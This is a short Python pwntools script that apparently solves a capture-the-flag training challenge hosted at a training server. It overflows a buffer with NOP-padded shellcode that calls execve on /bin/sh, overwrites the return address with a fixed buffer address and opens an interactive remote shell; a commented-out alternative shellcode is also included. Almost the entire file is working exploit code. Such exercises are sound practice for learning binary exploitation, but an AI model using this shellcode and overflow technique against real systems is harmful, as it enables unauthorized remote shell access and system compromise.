from pwn import *

#context.terminal = ['tmux', 'splitw' , '-h']
context.terminal = ['gnome-terminal', '-e']
r = remote("training.jinblack.it", 2001)
#r = process("./shellcode")
#gdb.attach(r)#, """"b *0x400709c""")
#input("wait")
print(r.recvuntil("name?\n"))
buffer_address = 0x601080 #-> "\x80\x10\x60\x00\x00\x00\x00\x00"
shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05"
shellcode = shellcode.ljust(200, b"\x90") + b"/bin/sh\x00" + b"\x00"*8
#shellcode is 27 bytes:  "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload =  shellcode.ljust(1016, b"\x90") + p64(buffer_address) 
#\x90"*1016 + p64(stack_address) + shellcode
#1016
r.send(payload)
r.interactive()